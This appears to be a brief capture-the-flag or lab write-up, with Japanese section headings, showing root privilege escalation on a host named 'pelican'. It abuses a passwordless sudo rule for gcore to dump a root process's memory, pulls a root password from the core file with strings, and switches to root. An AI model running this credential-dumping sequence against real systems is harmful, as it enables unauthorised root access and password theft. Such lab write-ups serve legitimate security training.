# sudo権限の確認
```bash
charles@pelican:~$ sudo -l
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
```

# クレデンシャルに関連するPIDの確認
```bash
ps aux
root 513  0.0  0.0 2276 0 ? Ss   Oct21   0:01 /usr/bin/password-store
```

# プロセスダンプ
```zsh
charles@pelican:~$ sudo gcore 513
0x00007f971bd1c6f4 in __GI___nanosleep (requested_time=requested_time@entry=0x7ffc3d7a2c80, remaining=remaining@entry=0x7ffc3d7a2c80) at ../sysdeps/unix/sysv/linux/nanosleep.c:28
28 ../sysdeps/unix/sysv/linux/nanosleep.c: No such file or directory.
Saved corefile core.513
[Inferior 1 (process 513) detached]
```

# パスワード抽出
```bash
charles@pelican:~$ strings core.513

001 Password: root:
ClogKingpinInning731

```

# 権限昇格
```bash
charles@pelican:~$ su root
Password: 

root@pelican:/home/charles# id
uid=0(root) gid=0(root) groups=0(root)
```